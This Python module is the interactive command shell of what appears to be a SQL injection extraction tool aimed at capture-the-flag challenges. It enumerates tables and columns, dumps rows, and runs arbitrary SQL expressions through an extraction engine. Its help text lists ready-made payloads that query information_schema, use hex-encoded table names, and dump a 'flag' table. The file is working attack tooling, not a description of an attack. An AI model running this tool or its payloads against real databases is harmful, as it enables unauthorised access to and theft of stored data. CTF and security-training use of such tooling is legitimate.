"""Interactive shell"""
from utils.helpers import format_row
from ui.progress import RollingBar


HELP = """
Available commands:
  tables              list all tables
  columns <table>     list all columns of a table
  data <table>        fetch data from a table
  expr <SQL expr>     directly extract an arbitrary SQL expression (a CTF staple; fast and precise)
  db                  current database name
  version             database version
  user                current user
  stats               request statistics
  help                help
  q                   quit

expr examples (pulls all table names in one shot, dozens of times faster than tables):
  expr (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())
  expr (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x666c6167)
  expr (SELECT GROUP_CONCAT(id,0x3a,content) FROM flag)
"""


def interactive_shell(dumper, db_name, max_rows=3, engine=None):
    print("\n" + "=" * 62)
    print("💡 Type help for help, q to quit")
    print("=" * 62 + "\n")

    tables_cache = None

    while True:
        try:
            cmd = input(">>> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd:
            continue
        parts = cmd.split()
        action = parts[0].lower()

        if action in ("q", "quit", "exit"):
            break

        elif action in ("help", "?"):
            print(HELP)

        elif action == "db":
            print(f"  Current database: {db_name}")

        elif action == "version":
            print(f"  Version: {dumper.get_version()}")

        elif action == "user":
            print(f"  User: {dumper.get_current_user()}")

        elif action == "stats":
            if engine and engine.req:
                st = engine.req.stats()
                print(f"  Total requests: {st['total']}")
                print(f"  Errors:   {st['errors']}")
                print(f"  Total time:   {st['time']:.1f}s")

        elif action in ("expr", "sql"):
            # take the raw content after "expr" so spaces in the expression are not split away
            sql_expr = cmd[len(parts[0]):].strip()
            if not sql_expr:
                print("  [!] Usage: expr <SQL expr>, e.g. "
                      "expr (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)")
                continue
            bar = RollingBar(width=20, prefix="  ")
            bar.start()
            try:
                val = dumper.eng.extract(sql_expr)
            except Exception as e:
                bar.stop()
                print(f"  [-] Extraction failed: {e}")
                continue
            bar.stop(final_msg=f"  [+] {val}" if val else "  [-] (empty)")

        elif action == "tables":
            if tables_cache is None:
                bar = RollingBar(width=20, prefix="  ")
                bar.start()
                tables_cache = dumper.get_tables(db_name)
                bar.stop()
            if not tables_cache:
                print("  (no tables)")
            else:
                for t in tables_cache:
                    print(f"  - {t}")

        elif action == "columns":
            if len(parts) < 2:
                print("  [!] Usage: columns <table>")
                continue
            table = parts[1]
            bar = RollingBar(width=20, prefix=f"  {table} ")
            bar.start()
            cols = dumper.get_columns(db_name, table)
            bar.stop()
            if not cols:
                print(f"  [-] Table {table} does not exist or has no columns")
                continue
            for c in cols:
                print(f"  - {c}")

        elif action == "data":
            if len(parts) < 2:
                print("  [!] Usage: data <table>")
                continue
            table = parts[1]

            bar = RollingBar(width=20, prefix="  Columns ")
            bar.start()
            cols = dumper.get_columns(db_name, table)
            bar.stop(final_msg=f"  [+] Columns: {', '.join(cols)}" if cols else "")

            if not cols:
                print(f"  [-] Table {table} does not exist")
                continue

            bar = RollingBar(width=20, prefix="  Data ")
            bar.start()
            rows = dumper.get_rows(table, cols, max_rows=max_rows)
            bar.stop()

            print(f"  📋 Table {table} data:")
            for row in rows:
                print(f"    {format_row(row)}")

        else:
            print(f"  [!] Unknown command: {cmd}")
            print(HELP)